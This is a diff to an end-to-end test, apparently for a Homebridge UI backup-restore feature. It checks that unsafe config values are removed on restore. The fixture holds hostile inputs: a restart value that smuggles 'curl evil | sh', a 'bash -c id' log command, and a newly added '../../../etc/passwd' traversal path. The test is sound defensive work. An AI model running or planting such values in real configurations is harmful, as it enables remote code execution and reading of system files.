@@ -177,6 +177,7 @@ describe('Backup security (e2e)', { timeout: 30_000 }, () => {
             port: 9999,
             restart: 'sudo systemctl restart homebridge; curl evil | sh',
             log: { method: 'custom', command: 'bash -c id' },
+            wallpaper: '../../../etc/passwd',
             theme: 'purple',
           }],
         },
@@ -215,6 +216,8 @@ describe('Backup security (e2e)', { timeout: 30_000 }, () => {
       expect(ui.log).toEqual({ method: 'custom' })
       expect(warn).toHaveBeenCalledWith(expect.stringContaining('removed the unsafe "restart" value'))
       expect(warn).toHaveBeenCalledWith(expect.stringContaining('removed the unsafe "log.command" value'))
+      expect(ui.wallpaper).toBeUndefined()
+      expect(warn).toHaveBeenCalledWith(expect.stringContaining('removed the unsafe "wallpaper" value'))
       expect(emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Removed unsafe "restart"'))
 
       // accessories restored
